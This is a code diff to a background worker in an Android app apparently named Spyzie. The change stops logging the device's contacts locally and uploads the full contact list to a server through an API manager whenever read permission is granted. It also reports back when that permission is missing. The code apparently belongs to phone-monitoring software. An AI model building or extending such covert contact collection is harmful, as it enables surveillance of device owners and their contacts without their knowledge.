@@ -1,5 +1,6 @@
 package com.tantd.spyzie.data.device.worker;
 
+import android.Manifest;
 import android.content.ContentResolver;
 import android.content.Context;
 import android.database.Cursor;
@@ -11,14 +12,25 @@ import androidx.annotation.NonNull;
 import androidx.work.Worker;
 import androidx.work.WorkerParameters;
 
+import com.tantd.spyzie.SpyzieApplication;
 import com.tantd.spyzie.data.model.Contact;
+import com.tantd.spyzie.data.model.Error;
+import com.tantd.spyzie.data.network.ApiManager;
 import com.tantd.spyzie.util.CommonUtils;
 import com.tantd.spyzie.util.Constants;
 
 import java.util.ArrayList;
 import java.util.List;
 
+import javax.inject.Inject;
+
+/**
+ * Created by tantd on 2/26/2020.
+ */
 public class GetContactsWorker extends Worker {
+
+    @Inject
+    ApiManager mApiManager;
 
     public GetContactsWorker(@NonNull Context context, @NonNull WorkerParameters workerParams) {
         super(context, workerParams);
@@ -27,10 +39,12 @@ public class GetContactsWorker extends Worker {
     @NonNull
     @Override
     public Result doWork() {
-        if (CommonUtils.checkReadContactsPermission(getApplicationContext())) {
-            printContacts(getAllContacts());
+        SpyzieApplication.getInstance().getAppComponent().inject(this);
+        if (CommonUtils.hasPermissions(getApplicationContext(), new String[]{Manifest.permission.READ_CONTACTS})) {
+            mApiManager.sendContactsData(getAllContacts());
         } else {
-            Toast.makeText(getApplicationContext(), "Have no permission", Toast.LENGTH_SHORT).show();
+            Toast.makeText(getApplicationContext(), "Has no permission", Toast.LENGTH_SHORT).show();
+            mApiManager.sendExceptionTracking(Error.HAS_NO_READ_CONTACTS_PERMISSION);
         }
         return Result.success();
     }
@@ -69,12 +83,5 @@ public class GetContactsWorker extends Worker {
         }
         cursor.close();
         return numbers;
-    }
-
-    private void printContacts(List<Contact> contacts) {
-        for (Contact contact :
-                contacts) {
-            Log.d(Constants.LOG_TAG, "" + contact);
-        }
     }
 }
